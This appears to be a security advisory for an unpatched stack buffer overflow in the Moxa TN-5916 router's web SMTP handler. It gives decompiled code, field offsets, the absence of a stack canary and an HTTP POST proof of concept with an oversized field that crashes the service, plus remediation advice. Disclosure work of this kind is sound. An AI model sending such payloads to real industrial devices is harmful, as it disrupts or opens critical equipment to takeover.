# Moxa TN-5916 v3.2/v3.3 was discovered to contain a stack buffer overflow in the web SMTP configuration handler

## Overview

- Vendor: Moxa
- Product: TN-5900-series / TN-5916 industrial security router
- Version: v3.2 and v3.3
- Component: magicP/WebServer/webs, SMTP configuration handler
- Vulnerability Class: CWE-121 stack buffer overflow
- CVSS 3.1 (tentative): 8.0 High `AV:A/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` (9.8 if the SMTP handler is reachable without a web session)
- Manufacturer: https://www.moxa.com/

## Affected versions

### v3.2 (2021-12)

- `moxa-tn-5900-series-firmware-v3.2.rom`.
- CramFS.
- `magicP/WebServer/webs`.

### v3.3 (2022-10)

- `moxa-tn-5900-series-firmware-v3.3.rom`.
- CramFS.
- `magicP/WebServer/webs`.

## Vulnerability details

`emalert.asp` submits the SMTP settings to:

```text
/goform/net_WebSMTPGetValue?SRV=SRV_SSMTP
```

The handler `net_WebSMTPGetValue` allocates a 388-byte stack buffer:

```c
_DWORD v4[123];   // 492 bytes
_BYTE  v5[388];   // SMTP configuration structure
__int64 v6, v7, v8;  // saved arguments after v5
...
smtpGetValue((__int64)v5, request);
```

`smtpGetValue` copies caller-controlled form values with unbounded
`strcpy`:

```c
mailhub    -> a1 + 0     // 52 bytes before the port field
AuthUser   -> a1 + 56    // 33 bytes before AuthPass
AuthPass   -> a1 + 89    // 33 bytes before SenderAddr
SenderAddr -> a1 + 122   // 51 bytes before DstAddr0
DstAddr0   -> a1 + 173   // 51 bytes before DstAddr1
DstAddr1   -> a1 + 224   // 51 bytes before DstAddr2
DstAddr2   -> a1 + 275   // 51 bytes before DstAddr3
DstAddr3   -> a1 + 326   // 62 bytes before the end of v5
```

There is no server-side length check. The HTML form uses
`maxlength="30"`/`maxlength="50"`, but a direct POST can send any length.
A value longer than its slot overwrites the following fields; a long
`DstAddr3` (or a long earlier field) reaches the saved arguments and the
function return address. The decompiled frame shows no stack canary
check, so the overwrite can directly control the saved return path.

The same `smtpGetValue` and `net_WebSMTPGetValue` code is present in both
v3.2 and v3.3 (only addresses differ).

## PoC

```http
POST /goform/net_WebSMTPGetValue?SRV=SRV_SSMTP HTTP/1.1
Host: <router>
Content-Type: application/x-www-form-urlencoded
Cookie: <valid web session>

mailhub=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&port=25
```

A 600+ byte `mailhub` overwrites the port field, the following SMTP
fields and the saved frame; a smaller request can target `DstAddr3` to
avoid corrupting earlier fields. The service may crash or return through
a corrupted address.

## Evidence

Static IDA decompilation, vendor form and hashes:

`experiments/vulnerability-triage/results/20261108-moxa-smtp-bof-01/evidence/`

- `static-v33-smtpGetValue-and-callers.txt` — v3.3 `smtpGetValue`,
  `net_WebSMTPGetValue`, `net_WebSsmtpSendTestMail`.
- `static-v32-smtpGetValue-and-callers.txt` — same code in v3.2.
- `vendor-emalert-form.txt` — `form.action` and the client-side
  `maxlength` fields.

No live device was used; this is a static finding. The handler was not
run under qemu-mips64 because the Moxa rootfs/userland could not be
booted in the available emulation setup.

## Impact

An authenticated web user can overflow a 388-byte stack structure and
overwrite saved arguments/return state. This is a classic stack
memory-corruption primitive; at minimum it crashes the web server, and
with a suitable MIPS64 ROP chain it can execute code in the web server
context. Moxa web sessions are commonly administrator-level, so the
practical impact is high.

## Remediation / known-CVE relation

- Bound every SMTP field with `strlcpy`/`snprintf` and enforce the
  documented maximum lengths server-side (mailhub 50, user/pass/address
  fields as appropriate).
- Reject control characters and overlong values before copying.
- NVD keyword searches for `Moxa smtpGetValue`, `net_WebSMTPGetValue`
  and `TN-5916 SMTP` returned zero matching CVEs on 2026-11-08. The
  existing `pingTemp` report is a different handler and stack frame.
  Candidate 0-day; no CVE assigned and no vendor contact has been made.

## Additional Information

```markdown
### Vendor
Moxa

### Product
TN-5900-series / TN-5916 industrial security router

### Version or Commit
v3.2 and v3.3

### Vulnerability Class
CWE-121 stack buffer overflow

### Description
emalert.asp submits SMTP settings; smtpGetValue copies the user-controlled fields into fixed stack buffers, overflowing the web server stack.

### Affected_component
magicP/WebServer/webs, SMTP configuration handler

### Attack_vector
Authenticated POST to the SMTP /goform endpoint with oversized SMTP fields.

### Product_version
TN-5900-series / TN-5916 industrial security router v3.2 and v3.3

### Reference
- https://www.moxa.com/
- https://github.com/vuln-1/vuln/blob/main/Moxa/TN-5916_V3.2/report-6.md
```
